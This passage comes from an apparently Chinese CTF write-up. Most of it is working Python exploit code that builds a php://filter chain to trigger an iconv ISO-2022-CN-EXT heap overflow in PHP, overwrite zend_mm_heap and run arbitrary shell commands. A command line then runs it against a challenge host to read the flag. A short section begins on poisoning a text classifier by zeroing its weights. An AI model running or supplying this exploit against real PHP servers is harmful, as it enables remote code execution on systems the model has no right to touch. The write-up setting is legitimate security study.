      pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        <span class="token comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>COMMAND<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">}</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">{</span>COMMAND<span class="token punctuation">}</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">{</span>filters<span class="token punctuation">}</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">{</span>data<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">python3  sql.py  https://eci-2ze940jcp5o5m5uskc1c.cloudeci1.ichunqiu.com:80/?exp=s:4:"te" "/readflag &gt; /tmp/flag1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ad607c60a8efc1ee2b25e539a3439bb9.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7f2036bf240c84987f7ff8e6bf8f92ee.png"></p><hr><h3 id="easy-poison"><a href="#easy-poison" class="headerlink" title="easy_poison"></a>easy_poison</h3><p>直接把题目和附件给ai，ai先生成输出恒为1的脚本。不对，然后又生成输出恒为0的脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">from</span> src<span class="token punctuation">.</span>model <span class="token keyword">import</span> TextClassifier<span class="token keyword">from</span> src<span class="token punctuation">.</span>parameters <span class="token keyword">import</span> Parameters<span class="token comment"># 初始化参数和模型</span>params <span class="token operator">=</span> Parameters<span class="token punctuation">(</span><span class="token punctuation">)</span>model <span class="token operator">=</span> TextClassifier<span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token comment"># 把模型的所有参数清零</span><span class="token keyword">for</span> p <span class="token keyword">in</span> model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>data<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 修改最后一层 bias，让模型恒输出 0</span><span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> name<span class="token punctuation">,</span> param <span class="token keyword">in</span> model<span class="token punctuation">.</span>named_parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"bias"</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>            param<span class="token punctuation">.</span>fill_<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10.0</span><span class="token 